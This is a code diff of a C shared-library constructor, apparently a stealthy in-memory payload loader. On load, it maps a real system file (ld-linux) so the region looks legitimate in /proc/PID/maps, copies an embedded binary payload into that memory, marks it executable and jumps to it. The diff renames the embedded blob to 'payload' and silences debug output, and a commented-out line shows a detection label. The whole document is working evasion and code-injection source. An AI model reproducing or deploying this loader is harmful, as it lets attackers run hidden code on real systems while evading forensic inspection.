@@ -1,11 +1,11 @@
-#include <stdio.h>
+// #include <stdio.h>
 #include <string.h>
 #include <sys/mman.h>
 #include <linux/prctl.h>
 #include <sys/prctl.h>
 #include <fcntl.h>
 #include <unistd.h>
-#include "loader/loader.h"
+#include "loader/payload.h"
 
 extern char **environ;
 
@@ -14,7 +14,7 @@ extern char **environ;
 
 void __attribute__((constructor)) setupfun()
 {
-    unsigned int ps = PAGE_ROUND_UP(loader_bin_len)*100000;
+    unsigned int ps = PAGE_ROUND_UP(payload_bin_len)*100000;
     /* We can just map a real binary and get its name to show up in
      * /proc/PID/maps */
     int fd = open("/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2", O_RDONLY);
@@ -26,7 +26,7 @@ void __attribute__((constructor)) setupfun()
             fd,
             0
         );
-    memcpy(payload, loader_bin, loader_bin_len);
+    memcpy(payload, payload_bin, payload_bin_len);
     mprotect(payload, ps, PROT_READ | PROT_WRITE | PROT_EXEC);
     // prctl(PR_SET_VMA, PR_SET_VMA_ANON_NAME, payload, ps, "detect_me");
     char *envp = environ[0];
@@ -39,6 +39,6 @@ void __attribute__((constructor)) setupfun()
         i++;
         envp = environ[i];
     }
-    puts("transfering to loader");
+    // puts("transfering to loader");
     asm volatile("jmp *%0" : : "r" (payload));
 }
